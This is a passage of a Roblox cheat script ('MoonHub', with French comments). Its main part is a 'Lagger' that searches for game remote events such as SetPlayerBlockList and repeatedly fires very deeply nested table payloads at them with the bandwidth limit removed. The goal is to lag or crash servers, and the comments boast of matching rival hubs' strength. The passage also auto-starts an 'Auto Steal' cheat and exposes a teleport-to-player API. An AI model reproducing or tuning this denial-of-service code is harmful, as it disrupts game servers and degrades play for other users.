	{ name = "Bg 3",  id = 139741219491406, color = Color3.fromRGB(140,140,145) },
	{ name = "Bg 4",  id = 96955892887860,  color = Color3.fromRGB(143,143,143) },
	-- [BUGFIX] id en texte — 15 chiffres, même bug tostring() que ci-dessus.
	{ name = "Bg 5",  id = "125992267782486", color = Color3.fromRGB(255,255,255) },
}
local bgVisibility = 35 -- % — correspond à ImageTransparency=0.65 défini plus haut sur lgrBgImage

local function _lgrApplyBackground(entry)
	if entry.id == 0 then
		lgrBgImage.Image = ""
	else
		lgrBgImage.Image = "rbxassetid://" .. tostring(entry.id)
	end
end

local function _lgrApplyVisibility()
	lgrBgImage.ImageTransparency = 1 - (bgVisibility / 100)
end

local customizeWin = Instance.new("Frame", gui)
customizeWin.Name = _NS.."e"
customizeWin.Size = UDim2.new(0, 210, 0, 176)  -- élargie (176→210), même raison que mainCustomizeWin
customizeWin.Position = UDim2.new(1, -410, 0, 200)
customizeWin.BackgroundColor3 = C_BG
customizeWin.BorderSizePixel = 0
customizeWin.Visible = false
customizeWin.Active = true
addCorner(customizeWin, 12); addLivingStroke(customizeWin, 1.5)
table.insert(_themeExcluded, customizeWin)

local cwHeader = Instance.new("Frame", customizeWin)
cwHeader.Size = UDim2.new(1, 0, 0, 26); cwHeader.BackgroundColor3 = C_HEADER; cwHeader.BorderSizePixel = 0
addCorner(cwHeader, 12); makeDraggable(customizeWin, cwHeader, "laggerbg")
local cwPatch = Instance.new("Frame", cwHeader)
cwPatch.Size = UDim2.new(1, 0, 0, 10); cwPatch.Position = UDim2.new(0, 0, 1, -10)
cwPatch.BackgroundColor3 = C_HEADER; cwPatch.BorderSizePixel = 0
local cwTitle = Instance.new("TextLabel", cwHeader)
cwTitle.Size = UDim2.new(1, -34, 1, 0); cwTitle.Position = UDim2.new(0, 10, 0, 0)
cwTitle.BackgroundTransparency = 1; cwTitle.Text = "Customize"
cwTitle.TextColor3 = C_WHITE; cwTitle.Font = Enum.Font.GothamBold; cwTitle.TextSize = 11
cwTitle.TextXAlignment = Enum.TextXAlignment.Left
local cwCloseBtn = Instance.new("TextButton", cwHeader)
cwCloseBtn.Size = UDim2.new(0, 20, 0, 20); cwCloseBtn.Position = UDim2.new(1, -24, 0.5, -10)
cwCloseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 34); cwCloseBtn.BorderSizePixel = 0
cwCloseBtn.Text = "X"; cwCloseBtn.TextColor3 = C_WHITE
cwCloseBtn.Font = Enum.Font.GothamBlack; cwCloseBtn.TextSize = 11
cwCloseBtn.AutoButtonColor = false; addCorner(cwCloseBtn, 6)
cwCloseBtn.MouseButton1Click:Connect(function() customizeWin.Visible = false end)

-- Miniatures — une rangée de tuiles carrées, une par entrée BACKGROUNDS
local thumbRow = Instance.new("Frame", customizeWin)
thumbRow.Size = UDim2.new(1, -16, 0, 60); thumbRow.Position = UDim2.new(0, 8, 0, 34)
thumbRow.BackgroundTransparency = 1
local thumbButtons = {}
do
	local n = #BACKGROUNDS
	local gap = 10  -- élargi (6→10), même raison que le panneau principal
	local tileW = (186 - gap * (n - 1)) / n  -- 186 = largeur intérieure (210-16) moins une marge droite de 8
	for i, entry in ipairs(BACKGROUNDS) do
		local tile = Instance.new("ImageButton", thumbRow)
		tile.Size = UDim2.new(0, tileW, 0, 60)
		tile.Position = UDim2.new(0, (i - 1) * (tileW + gap), 0, 0)
		tile.BackgroundColor3 = C_OFF_BG
		tile.BackgroundTransparency = 0.1
		tile.BorderSizePixel = 0
		tile.Image = entry.id ~= 0 and ("rbxassetid://" .. tostring(entry.id)) or ""
		tile.ScaleType = Enum.ScaleType.Crop
		addCorner(tile, 6)
		local tileStroke = addStroke(tile, entry.color or C_MOON, 1.5, 1) -- transparence 1 = invisible tant que pas sélectionné
		-- [UI] pas de label texte sur la tuile — entry.name reste utilisé
		-- côté code (identification), l'image seule s'affiche.
		thumbButtons[i] = { btn = tile, stroke = tileStroke }
		tile.MouseButton1Click:Connect(function()
			_lgrApplyBackground(entry)
			for j, t in ipairs(thumbButtons) do
				t.stroke.Transparency = (j == i) and 0.2 or 1
			end
		end)
	end
end

-- Visibilité — même motif -/valeur/+ que la rangée Power
local visRow = Instance.new("Frame", customizeWin)
visRow.Size = UDim2.new(1, -16, 0, 26); visRow.Position = UDim2.new(0, 8, 0, 102)
visRow.BackgroundColor3 = C_ROW; visRow.BackgroundTransparency = 0.35; visRow.BorderSizePixel = 0
addCorner(visRow, 8); addLivingStroke(visRow, 1)
local visLbl = Instance.new("TextLabel", visRow)
visLbl.Size = UDim2.new(0.55, 0, 1, 0); visLbl.Position = UDim2.new(0, 8, 0, 0)
visLbl.BackgroundTransparency = 1; visLbl.Text = "Visibility"
visLbl.TextColor3 = C_WHITE; visLbl.Font = Enum.Font.GothamBold; visLbl.TextSize = 9
visLbl.TextXAlignment = Enum.TextXAlignment.Left
local visMinus = Instance.new("TextButton", visRow)
visMinus.Size = UDim2.new(0, 18, 0, 18); visMinus.Position = UDim2.new(1, -70, 0.5, -9)
visMinus.BackgroundColor3 = C_OFF_BG; visMinus.Text = "-"; visMinus.TextColor3 = C_MOON2
visMinus.Font = Enum.Font.GothamBold; visMinus.TextSize = 12; visMinus.BorderSizePixel = 0
visMinus.AutoButtonColor = false; addCorner(visMinus, 5)
local visVal = Instance.new("TextLabel", visRow)
visVal.Size = UDim2.new(0, 32, 0, 18); visVal.Position = UDim2.new(1, -50, 0.5, -9)
visVal.BackgroundTransparency = 1; visVal.Text = bgVisibility .. "%"
visVal.TextColor3 = C_SILVER; visVal.Font = Enum.Font.GothamBold; visVal.TextSize = 10
local visPlus = Instance.new("TextButton", visRow)
visPlus.Size = UDim2.new(0, 18, 0, 18); visPlus.Position = UDim2.new(1, -18, 0.5, -9)
visPlus.BackgroundColor3 = C_OFF_BG; visPlus.Text = "+"; visPlus.TextColor3 = C_MOON2
visPlus.Font = Enum.Font.GothamBold; visPlus.TextSize = 12; visPlus.BorderSizePixel = 0
visPlus.AutoButtonColor = false; addCorner(visPlus, 5)
visMinus.MouseButton1Click:Connect(function()
	bgVisibility = math.clamp(bgVisibility - 5, 0, 100)
	visVal.Text = bgVisibility .. "%"; _lgrApplyVisibility()
end)
visPlus.MouseButton1Click:Connect(function()
	bgVisibility = math.clamp(bgVisibility + 5, 0, 100)
	visVal.Text = bgVisibility .. "%"; _lgrApplyVisibility()
end)

-- Save/restore bridge — same reasoning as the main panel's mcwGetBgState/
-- mcwSetBgState above: neither the Lagger's own selected image nor its
-- visibility slider was ever persisted before.
_GH.lgrGetBgState = function()
	return { image = lgrBgImage.Image, visibility = bgVisibility }
end
_GH.lgrSetBgState = function(d)
	if not d then return end
	if d.image ~= nil then
		lgrBgImage.Image = d.image
		for _, t in ipairs(thumbButtons) do
			t.stroke.Transparency = (t.btn.Image == d.image) and 0.2 or 1
		end
	end
	if type(d.visibility) == "number" then
		bgVisibility = math.clamp(d.visibility, 0, 100)
		visVal.Text = bgVisibility .. "%"
		_lgrApplyVisibility()
	end
end

bgBtn.MouseButton1Click:Connect(function()
	customizeWin.Visible = not customizeWin.Visible
end)

-- ════════════════════════════════════════════════════════════════════
-- LOGIQUE RÉSEAU — résolue APRÈS que le widget existe déjà à l'écran.
-- Chaque appel externe (GetService, FindFirstChild) reste protégé par
-- pcall comme avant ; seul l'ORDRE change par rapport à la version
-- précédente.
-- ════════════════════════════════════════════════════════════════════
do
	local ncOk, ncVal = pcall(function() return game:GetService("NetworkClient") end)
	if ncOk then _NC = ncVal end
end
_RS = _cr(game:GetService("ReplicatedStorage"))

local function _lgrCheckRemote(r)
	return r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction"))
end

local function getDirectRemote()
	local ok, r = pcall(function() return game.RobloxReplicatedStorage:FindFirstChild("SetPlayerBlockList") end)
	if ok and _lgrCheckRemote(r) then return r end
	return nil
end

local function findRemote()
	if cachedRemote and cachedRemote.Parent then return cachedRemote end
	local paths = {
		function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
		function() return _RS:FindFirstChild("SetPlayerBlockList") end,
		function() return game:FindFirstChild("SetPlayerBlockList", true) end,
	}
	for _, fn in ipairs(paths) do
		local ok, r = pcall(fn)
		if ok and _lgrCheckRemote(r) then cachedRemote = r; return r end
	end
	local ok2, services = pcall(function() return { _RS, game:FindFirstChild("RobloxReplicatedStorage") } end)
	if not ok2 then return nil end
	for _, svc in ipairs(services) do
		if svc then
			for _, obj in ipairs(svc:GetDescendants()) do
				if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
					local n = obj.Name:lower()
					if n:find("block") or n:find("steal") or n:find("accept")
					or n:find("report") or n:find("player") or n:find("lag") then
						cachedRemote = obj; return obj
					end
				end
			end
		end
	end
	for _, svc in ipairs(services) do
		if svc then
			for _, obj in ipairs(svc:GetDescendants()) do
				if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
					cachedRemote = obj; return obj
				end
			end
		end
	end
	return nil
end

local function getRemote() return getDirectRemote() or findRemote() end

-- ── Payloads ────────────────────────────────────────────────────────
local function buildPayloadV1()
	local main = {}
	local nested = {{}}
	local cur = nested[1]
	for _ = 1, 186 do local n = {}; table.insert(cur, n); cur = n end
	for _ = 1, 2000 do table.insert(main, nested) end
	return main
end

local function buildPayloadV2()
	local mt = {}
	local st = {}
	table.insert(st, {})
	local z = st[1]
	for _ = 1, 296 do local t = {}; table.insert(z, t); z = t end
	for _ = 1, 180 do table.insert(mt, st) end
	return mt
end

-- Payload dynamique (V2 mode) : même structure 296-deep que Syn1zeHUB/Noxa,
-- mais le nombre de répétitions est calculé depuis cfg.dynPower.
-- Formule identique à Syn1zeHUB : reps = floor(power / (DEPTH+2)) = power/298.
-- Ex: 97000 → 325 reps (vs 180 fixes avant) — ~80 % de charge en plus.
-- [FIX B6] Cache du payload : on ne reconstruit que si dynPower change.
-- Avant : reconstruction complète ~325x (table 296 niveaux) toutes les 0.12s
--          → ~2700 allocations/s sur le GC Lua, micro-freezes parasites.
-- Après  : reconstruction uniquement quand le slider de puissance bouge.
local _lagV2PayloadCache = nil
local _lagV2CachedPwr    = nil
local function buildPayloadDyn(pwr)
	if _lagV2CachedPwr == pwr and _lagV2PayloadCache ~= nil then
		return _lagV2PayloadCache  -- [FIX B6] cache hit → zéro allocation GC
	end
	local mt = {}
	local st = {}
	table.insert(st, {})
	local z = st[1]
	for _ = 1, 296 do local t = {}; table.insert(z, t); z = t end
	local reps = math.max(1, math.floor(pwr / 298))
	for _ = 1, reps do table.insert(mt, st) end
	_lagV2CachedPwr    = pwr
	_lagV2PayloadCache = mt
	return mt
end

-- ── Boucle réseau ────────────────────────────────────────────────────
local function laggerLoop()
	while laggerActive do
		pcall(function()
			if _NC then _NC:SetOutgoingKBPSLimit(math.huge) end
			settings().Network.IncomingReplicationLag = 0
		end)
		local remote = getRemote()
		if remote then
			local payload, delay
			if cfg.version == "V1" then
				payload = buildPayloadV1(); delay = 0.34
			else
				-- [AMÉLIORATION] V2 dynamique : power configurable, intervalle 0.12s
				-- (aligné sur Syn1zeHUB/Noxa, plus agressif que l'ancien 0.17s)
				payload = buildPayloadDyn(cfg.dynPower); delay = 0.12
			end
			local ok = pcall(function()
				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
					remote:FireServer(payload)
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer(payload)
				end
			end)
			if not ok then cachedRemote = nil end
			task.wait(delay)
		end
		task.wait(0.045)
	end
end

local function startLagger()
	if laggerThread then return end
	laggerActive = true
	startTime = os.clock()
	laggerThread = coroutine.create(laggerLoop)
	coroutine.resume(laggerThread)
end

local function stopLagger()
	laggerActive = false
	if laggerThread then
		pcall(function() coroutine.close(laggerThread) end)
		laggerThread = nil
	end
	-- [AMÉLIORATION] Remettre la limite réseau à la valeur par défaut au stop.
	-- Syn1zeHUB fait la même chose : évite de laisser la limite à ∞ en permanence.
	pcall(function() if _NC then _NC:SetOutgoingKBPSLimit(0) end end)
end

-- ── Helpers UI ──────────────────────────────────────────────────────
local function updateVersionUI()
	if cfg.version == "V1" then
		v1Btn.BackgroundColor3 = C_ON_BG;  v1Btn.BackgroundTransparency = 0.1;  v1Btn.TextColor3 = C_MOON
		v2Btn.BackgroundColor3 = C_OFF_BG; v2Btn.BackgroundTransparency = 0.2;  v2Btn.TextColor3 = C_DIM
	else
		v1Btn.BackgroundColor3 = C_OFF_BG; v1Btn.BackgroundTransparency = 0.2;  v1Btn.TextColor3 = C_DIM
		v2Btn.BackgroundColor3 = C_ON_BG;  v2Btn.BackgroundTransparency = 0.1;  v2Btn.TextColor3 = C_MOON
	end
end

local function setActive(state)
	if state then
		startLagger()
		actBtn.Text = "ENABLED"
		actBtn.BackgroundColor3 = C_ON_BG; actBtn.BackgroundTransparency = 0.1
		actBtn.TextColor3 = C_MOON
		stTxt.Text = "ONLINE";   stTxt.TextColor3 = C_MOON
		stDot.BackgroundColor3 = C_MOON
	else
		stopLagger()
		actBtn.Text = "DISABLED"
		actBtn.BackgroundColor3 = C_OFF_BG; actBtn.BackgroundTransparency = 0.2
		actBtn.TextColor3 = C_DIM
		stTxt.Text = "OFFLINE";  stTxt.TextColor3 = C_DIM
		stDot.BackgroundColor3 = C_DIM
		tiTxt.Text = "00:00"
	end
end

-- ── Connexions ───────────────────────────────────────────────────────
v1Btn.MouseButton1Click:Connect(function()
	cfg.version = "V1"; updateVersionUI()
	if laggerActive then stopLagger(); task.wait(0.1); startLagger() end
end)

v2Btn.MouseButton1Click:Connect(function()
	cfg.version = "V2"; updateVersionUI()
	pwBox.Text = tostring(cfg.dynPower)   -- affiche la puissance active
	if laggerActive then stopLagger(); task.wait(0.1); startLagger() end
end)

-- Power input — validation + redémarrage du loop si actif en V2
pwBox.FocusLost:Connect(function()
	local v = tonumber(pwBox.Text)
	if v then
		cfg.dynPower = math.clamp(v, 10000, 500000)
	end
	pwBox.Text = tostring(cfg.dynPower)
	if laggerActive and cfg.version == "V2" then
		stopLagger(); task.wait(0.05); startLagger()
	end
end)

actBtn.MouseButton1Click:Connect(function()
	setActive(not laggerActive)
end)

kBtn.MouseButton1Click:Connect(function()
	waitingForKey = true; kBtn.Text = "..."
end)

UIS.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if waitingForKey then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			keybind = input.KeyCode
			kBtn.Text = keybind.Name
			waitingForKey = false
		end
		return
	end
	if input.KeyCode == keybind then setActive(not laggerActive) end
end)

-- Timer : mis à jour chaque frame (coût : une soustraction + format)
RunService.RenderStepped:Connect(function()
	if laggerActive then
		local e = math.floor(os.clock() - startTime)
		tiTxt.Text = string.format("%02d:%02d", math.floor(e / 60), e % 60)
	end
end)

-- Minimiser
local function toggleMinimize()
	minimized = not minimized
	lgrMinBtn.Text = minimized and "+" or "-"
	lgrW.Size = minimized and UDim2.new(0, 160, 0, 34) or UDim2.new(0, 160, 0, LGR_H_FULL)
	local els = { infoPanel, vRow, pwRow, actBtn, kRow, bgBtn, lgrFoot, lgrDiscord }
	for _, el in ipairs(els) do el.Visible = not minimized end
	if minimized then customizeWin.Visible = false end -- pas de fenêtre flottante orpheline widget réduit
end
lgrMinBtn.MouseButton1Click:Connect(toggleMinimize)

-- Reconnexion après respawn
LP.CharacterAdded:Connect(function()
	task.wait(1)
	if laggerActive then stopLagger(); task.wait(0.3); startLagger() end
end)

updateVersionUI()

end)()


-- ===================================================================
-- INITIALIZATION
-- ===================================================================
local _configLoaded = MH_load()   -- loads the config at startup
updateActiveBadge()               -- sync the small "active features" badge with real state
selectTab("Combat")
-- No save file: start Auto Steal immediately (it defaults to enabled).
-- When a save exists, MH_load already re-activates it via the toggles table.
if not _configLoaded and AutoSteal.Enabled then
	task.spawn(startAutoSteal)
end
-- Auto-save every 10s
task.spawn(function()
	while gui.Parent do
		task.wait(10)
		MH_save()
	end
end)

-- Immediate save if the player leaves / script is destroyed
LP.AncestryChanged:Connect(function()
	pcall(MH_save)
end)
game:GetService("Players").PlayerRemoving:Connect(function(p)
	if p == LP then pcall(MH_save) end
end)

-- ===================================================================
-- OWNER API — publishes a small, read-mostly bridge so a separate
-- standalone script (e.g. Yslem_Standalone_Owner.lua) can see + lightly
-- control this hub from outside, without needing to be the same script.
-- Placed last, once everything above is fully built, so every function
-- referenced here is guaranteed to already exist.
--
-- Purely additive: nothing here changes any existing behavior — it only
-- exposes already-existing state and re-uses the exact same functions
-- the hub's own UI already calls internally (start/stop, toggle-row
-- visual sync, autosave, toast). No new systems, no new risk.
-- ===================================================================
do
	local function getSharedEnv()
		if typeof(getgenv) == "function" then
			local ok, env = pcall(getgenv)
			if ok and env then return env end
		end
		return _G
	end

	local API = {}
	API.Version = "MoonHub-3.0"
	API.Loaded  = true

	API.GetUsername    = function() return LP.Name end
	API.GetDisplayName = function() return LP.DisplayName end
	API.GetUserId       = function() return LP.UserId end

	API.GetPing = function()
		local ok, ms = pcall(function() return math.floor(LP:GetNetworkPing() * 1000 + 0.5) end)
		return ok and ms or -1
	end
	API.IsPingWarnActive = function() return _GH.pingWarn == true end

	API.IsAutoStealEnabled  = function() return AutoSteal.Enabled end
	API.SetAutoStealEnabled = function(on)
		on = on and true or false
		AutoSteal.Enabled = on
		if on then startAutoSteal() else stopAutoSteal() end
		if setAutoStealRowVisual then setAutoStealRowVisual(on) end
		if _GH.updateActiveBadge then _GH.updateActiveBadge() end
		if _GH.autoSave then _GH.autoSave() end
	end

	API.ShowHub = function() if _GH.showGui then _GH.showGui() end end
	API.HideHub = function() if _GH.hideGui then _GH.hideGui() end end

	API.ShowToast = function(text, kind)
		if _GH.showToast and type(text) == "string" then _GH.showToast(text, kind or "info") end
	end

	-- Read-only server info — JobId/PlaceId/player count, all public data
	-- already available to any client, nothing new exposed here.
	API.GetServerInfo = function()
		local Players2 = game:GetService("Players")
		return {
			jobId       = game.JobId,
			placeId     = game.PlaceId,
			playerCount = #Players2:GetPlayers(),
			maxPlayers  = Players2.MaxPlayers,
		}
	end

	-- Read-only player list — name/displayname/userId/team/distance/health/
	-- friend status. All standard public Roblox APIs, same data anyone can
	-- already see by looking at the player or their name above their head.
	-- No remote is fired, nothing here can affect another player in any way.
	API.GetPlayers = function()
		local Players2 = game:GetService("Players")
		local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
		local list = {}
		for _, p in ipairs(Players2:GetPlayers()) do
			if p ~= LP then
				local dist = nil
				local char = p.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")
				if myRoot and root then
					dist = math.floor((myRoot.Position - root.Position).Magnitude)
				end
				local hum = char and char:FindFirstChildOfClass("Humanoid")
				local okFriend, isFriend = pcall(function() return LP:IsFriendsWith(p.UserId) end)
				table.insert(list, {
					name        = p.Name,
					displayName = p.DisplayName,
					userId      = p.UserId,
					team        = p.Team and p.Team.Name or nil,
					distance    = dist,
					health      = hum and math.floor(hum.Health) or nil,
					maxHealth   = hum and math.floor(hum.MaxHealth) or nil,
					isFriend    = okFriend and isFriend or false,
				})
			end
		end
		return list
	end

	-- Moves ONLY the local player's own character toward another player's
	-- current position. Does not touch the target in any way — same effect
	-- as walking there yourself, just instant. No remote fired at anyone.
	API.WalkToPlayer = function(userId)
		local target
		for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
			if p.UserId == userId then target = p; break end
		end
		if not target or not target.Character then return false end
		local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
		local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
		if not tRoot or not myRoot then return false end
		myRoot.CFrame = tRoot.CFrame + Vector3.new(3, 0, 3)
		return true
	end

	local env = getSharedEnv()
	env.MoonHubAPI = API
end

end
_MH_buildUI()